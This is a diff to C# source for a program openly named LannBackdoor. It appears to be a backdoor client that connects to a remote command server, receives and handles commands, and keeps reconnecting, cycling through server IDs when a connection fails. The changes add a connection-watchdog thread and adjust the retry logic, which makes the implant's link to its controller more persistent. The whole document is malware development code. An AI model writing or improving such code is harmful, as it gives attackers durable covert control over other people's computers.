@@ -6,7 +6,6 @@ using ModulesApi;
 using Networking;
 using Networking.Packets;
 using Networking.Structures;
-using Newtonsoft.Json.Linq;
 using Serilog.Core;
 using SystemModule;
 using Constants = LannConstants.Constants;
@@ -17,6 +16,8 @@ public static class LannBackdoor {
     private static readonly Logger Logger = LoggerFactory.CreateLogger("LannBackdoor");
     private static TCPClient _tcpClient = null!;
     private static int _serverId;
+
+    private static bool pinging = false;
 
     public static async Task Main() {
         Console.OutputEncoding = Encoding.UTF8;
@@ -38,26 +39,33 @@ public static class LannBackdoor {
             Constants.Debug,
             Utils.CreateUrl(_serverId),
             Constants.Port);
-
+        
+        new Thread(() => {
+            while (true) {
+                if (pinging) {
+                    if (!_tcpClient.IsConnected) {
+                        Logger.Error("Server is closed!");
+                        _tcpClient.Dispose();
+                    }
+                }
+            
+                Thread.Sleep(5000);
+            }
+        }).Start();
+        
         ModuleRegistry.LoadByAssembly(typeof(SystemModuleImpl).Assembly);
         await Connect();
 
         while (true) await Task.Delay(1000);
     }
 
-    private static async Task Connect() {
+    private static async Task Connect(bool inc = false) {
         _tcpClient = new TCPClient(Utils.CreateUrl(_serverId), Constants.Port);
-
         _tcpClient.OnConnect += async (_, _) => {
             Logger.Information("Connected!");
             await _tcpClient.SendPacket(new ClientPacket { Type = PacketType.Ready });
+            pinging = true;
             _tcpClient.StartHandlingPackets();
-
-            // await Task.Delay(10000);
-            // if (!_tcpClient.IsVerified) {
-            //     Logger.Error("Socket did not verify in 10 seconds!");
-            //     _tcpClient.Dispose();
-            // }
         };
 
         _tcpClient.OnCommand += async (_, data) => {
@@ -99,6 +107,7 @@ public static class LannBackdoor {
         };
 
         _tcpClient.OnClose += async (_, _) => {
+            pinging = false;
             Logger.Information("Socket closed, reconnecting in 5000 ms");
             await Task.Delay(5000);
             await Connect();
@@ -107,9 +116,9 @@ public static class LannBackdoor {
         try {
             await _tcpClient.Connect();
         } catch {
-            Logger.Information("Connection failed, connecting to server {Id} in 5000 ms", ++_serverId);
+            Logger.Information("Connection failed, connecting to server {Id} in 5000 ms", inc ? ++_serverId : _serverId);
             await Task.Delay(5000);
-            await Connect();
+            await Connect(true);
         }
     }
 }
